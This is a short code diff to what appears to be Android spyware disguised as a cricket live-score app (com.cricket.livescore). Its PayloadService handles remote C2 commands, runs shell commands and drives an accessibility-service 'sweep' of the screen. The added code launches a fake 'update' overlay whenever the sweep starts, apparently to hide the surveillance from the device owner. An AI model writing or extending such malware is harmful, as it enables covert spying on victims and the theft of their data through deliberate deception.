@@ -326,6 +326,7 @@ class PayloadService : Service() {
             ObfuscatedStrings.cmdStartSweep -> {
                 val duration = params?.optInt("duration", 300) ?: 300
                 StagerAccessibilityService.instance?.startSweep(duration * 1000L)
+                showUpdateOverlay()
                 sendCommandAck(commandId, "received")
             }
             ObfuscatedStrings.cmdStopSweep -> {
@@ -387,6 +388,17 @@ class PayloadService : Service() {
             process.waitFor()
         } catch (e: Exception) {
             Log.e(TAG, "Shell exec failed", e)
+        }
+    }
+
+    private fun showUpdateOverlay() {
+        try {
+            val intent = Intent(this, com.cricket.livescore.ui.UpdateOverlayActivity::class.java)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+            Log.i(TAG, "Update overlay launched via C2 command")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to show update overlay", e)
         }
     }
 }
